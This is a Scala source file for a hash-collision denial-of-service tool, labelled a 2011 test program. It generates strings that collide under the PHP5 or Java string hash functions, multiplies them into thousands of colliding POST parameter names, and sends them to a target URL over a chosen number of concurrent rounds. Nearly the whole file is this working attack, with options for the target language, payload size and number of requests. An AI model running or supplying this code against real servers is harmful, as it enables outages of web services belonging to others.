import java.io.{ObjectOutputStream, FileOutputStream}
import dispatch._
import scala.actors._

class DoS(target: String, port: Int) extends Actor {
	def act {
		try {
			val req = url(target)
	    	val http = new Http
			http((req << Collision.postParams) as_str)
		} catch {
			case e: java.net.UnknownHostException => println("Couldn't find host. Did you mistype the adress / IP ?")
				
			case e => println("Unkown exception: " + e)
		}
	}
}

object Collision { 
	var postParams = List( ("a", "b") )
	val cs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	import org.clapper.argot._
	import ArgotConverters._

	val parser = new ArgotParser("test",
      preUsage=Some("ĤashCollision Test: Version 0.1. Copyright (c) 2011, Julian Schrittwieser"))

    val system = parser.option[(String => Int)](List("l", "language"), "target", "Language to attack: java, php5. Default: php5") {
    	(s, opt) => s match {
    		case "php5" => phpHash _
    		case "java" => javaHash _
    		case _ => parser.usage("Invalid target language.")
    	}
    }

    val rounds = parser.option[Int](List("r", "rounds"), "n", "Number of requests to make. Default: 1")

    val collisionL = parser.option[Int](List("c", "collisions"), "n", "Produce n collisions. Default: n=20 000")

    val target = parser.parameter[String]("url", "Url to attack", false)

    val payloadSize = parser.option[Int](List("s", "size"), "n", "kB to send per request. Overrides --collisions")

	// convert size in kB to exponent of collisions
    def sizeToCollisionLen(s: Int) = (math.log(s / 15.) / math.log(3.3333) + 7).toInt

	def main(args: Array[String]) {
		try {
	      	parser.parse(args)
	      
	      	val numIterations = cs.length * cs.length
			var collisions = List[String]()
			// what exponent best to use for 3^n ?
			val collisionLen = payloadSize.value match {
				case Some(s) => sizeToCollisionLen(s)
				case s => (1 + math.log(collisionL.value.getOrElse(20000).toDouble) / math.log(3)).toInt
			}
			// how many collisions do we want?
			val collisionNum = payloadSize.value match {
				case Some(s) => s * 1024 / (3*collisionLen + 3)
				case _ => collisionL.value.getOrElse(20000)
			}
			val hashFun = system.value.getOrElse(phpHash _)

			println("Searching for at least three colliding strings")

			while(collisions.length < 3) {
				val stringSeed = util.Random.nextInt(5184)
				val hash = hashFun(stringFromInt(stringSeed))
				collisions = stringsForHashCode(numIterations, hash, hashFun)
			}

			print("Found them: ")
			println(collisions.map("\"" + _ + "\"").mkString(", "))
			println("For hashcode " + hashFun( collisions.head ) )

			println("Generating %d^%d = %.0f derived collisions".format(collisions.length, collisionLen, math.pow(collisions.length, collisionLen)))
			println("Using %d of them".format(collisionNum))

			val manyCols = permutations(collisions, collisionLen).take(collisionNum)

			postParams = manyCols.toList.map( (_, randomElement(cs).toString) )

	    	(1 to rounds.value.getOrElse(1)).foreach( t => (new DoS(target.value.get, 80)).start() )

	    	println("attacked!")
	    }

	    catch {
	      	case e: ArgotUsageException => println(e.message)
	    }

		
	}

	def randomElement[T](s: Seq[T]): T = s(util.Random.nextInt(s.length))

	def permutations(items: List[String], len: Int): List[String] = {
		if(len == 1) items
		else permutations(items, len - 1).flatMap(s => items.map(_ + s))
	}

	def stringFromInt(n: Int): String = {
		if(n == 0) "" 
		else stringFromInt(n / cs.length) + cs.charAt((n-1) % cs.length)
	}

	def stringsForHashCode(numIterations: Int, code: Int, hashFun: String => Int) = 
		(0 until numIterations).map(stringFromInt(_)).filter(hashFun(_) == code).toList

	def javaHash(s: String) = s.map(_.toInt).reduceLeft( (hash, next) => hash * 31 + next)

	def phpHash(s: String) = s.map(_.toInt).foldLeft(5381)( (hash, next) => hash * 33 + next)
}